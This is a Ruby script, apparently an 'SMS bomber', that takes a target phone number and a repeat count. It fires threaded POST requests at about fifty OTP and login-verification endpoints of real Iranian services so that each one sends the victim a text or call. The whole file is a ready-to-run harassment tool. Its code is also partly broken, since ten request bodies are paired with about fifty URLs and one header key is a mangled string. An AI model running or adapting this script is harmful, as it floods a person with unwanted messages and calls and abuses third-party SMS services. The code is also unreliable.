require 'net/http' require 'json'

def clear_screen system("clear") || system("cls") end

def sms(url, header) sleep(3) json_data = header.to_json begin resp = Net::HTTP.post(URI(url), json_data, "Content-Type" => "application/json") if resp.code != "200" puts "\033[01;31m[-] Error ! " else puts "\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSended" end rescue Exception => e puts "\033[01;31m[-] Error ! " end end

def main clear_screen puts "\033[01;33m" puts """\n\t\t\t\t\t\t\t\t\t\t

 
Coded By NICOLA(Telegram: @black_nicola)
 GitHub : mr-r0ot

\t\t\t\t\t\t\t\t\t\t """
print "\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter phone 09xxxxxxxxxx: \033[00;36m"
phone = gets.chomp
print "\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter Number sms and call: \033[00;36m"
repeat_count = gets.chomp.to_i

urls = ["https://3tex.io/api/1/users/validation/mobile", 
        "https://deniizshop.com/api/v1/sessions/login_request", 
        "https://flightio.com/bff/Authentication/CheckUserKey", 
        "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp",
        "https://bck.behtarino.com/api/v1/users/phone_verification/",
        "https://abantether.com/users/register/phone/send/",
        "https://novinbook.com/index.php?route=account/phone",
        "https://www.azki.com/api/vehicleorder/api/customer/register/login-with-vocal-verification-code?phoneNumber=" + phone,
        "https://api.pooleno.ir/v1/auth/check-mobile",
        "https://agent.wide-app.ir/auth/token",
        "https://tap33.me/api/v2/user",
        "https://web.emtiyaz.app/json/login",
        "https://api.divar.ir/v5/auth/authenticate",
        "https://messengerg2c4.iranlms.ir/",
        "https://nx.classino.com/otp/v1/api/login",
        "https://bama.ir/signin-checkforcellnumber",
        "https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass?lat=35.774&long=51.418&optionalClient=WEBSITE&client=WEBSITE&deviceType=WEBSITE&appVersion=8.1.0&UDID=39c62f64-3d2d-4954-9033-816098559ae4&locale=fa",
        "https://ws.alibaba.ir/api/v3/account/mobile/otp",
        "https://api.bitbarg.com/api/v1/authentication/registerOrLogin",
        "https://api.bahramshop.ir/api/user/validate/username",
        "https://mobapi.banimode.com/api/v2/auth/request",
        "https://takshopaccessorise.ir/api/v1/sessions/login_request",
        "https://api.bitpin.ir/v1/usr/sub_phone/",
        "https://chamedoon.com/api/v1/membership/guest/request_mobile_verification",
        "https://server.kilid.com/global_auth_api/v1.0/authenticate/login/realm/otp/start?realm=PORTAL",
        "https://pinket.com/api/cu/v2/phone-verification",
        "https://core.otaghak.com/odata/Otaghak/Users/SendVerificationCode",
        "https://www.shab.ir/api/fa/sandbox/v_1_4/auth/enter-mobile",
        "https://bit24.cash/app/api/auth/check-mobile",
        "https://app.itoll.ir/api/v1/auth/login",
        "https://api.raybit.net:3111/api/v1/authentication/register/mobile",
        "https://www.pubisha.com/login/checkCustomerActivation",
        "https://farvi.shop/api/v1/sessions/login_request",
        "https://gw.taaghche.com/v4/site/auth/signup",
        "https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request",
        "https://www.sheypoor.com/auth",
        "https://api.snapp.ir/api/v1/sms/link",
        "https://a4baz.com/api/web/login",
        "https://api.anargift.com/api/people/auth",
        "https://nobat.ir/api/public/patient/login/phone",
        "https://www.buskool.com/send_verification_code",
        "https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode",
        "https://www.simkhanapi.ir/api/users/registerV2",
        "https://sandbox.sibirani.ir/api/v1/user/invite",
        "https://shop.hyperjan.ir/api/users/manage",
        "https://api.digikala.com/v1/user/authenticate/",
        "https://hiword.ir/wp-json/otp-login/v1/login",
        "https://abantether.com/users/register/phone/send/",
        "https://api.bit24.cash/api/v3/auth/check-mobile",
]

headers = [{
        "receptorPhone": phone,
    }, {
        "mobile_phone": phone,
    }, {
        "userKey": phone,
    }, {
        "cellphone": phone,
    }, {
        "phone": phone,
    }, {
        "phoneNumber": phone,
    }, {
        "phone": phone,
    }, {
        "esfelurm": "esfelurm",
    }, {
        "mobile": phone,
    }, {
        "'grant_type': 'otp', 'client_id': '62b30c4af53e3b0cf100a4a0', 'phone'": phone,
    }
    ]

repeat_count.times do
    urls.zip(headers).each do |url, header|
        Thread.new { sms(url, header) }
    end
end

end

main
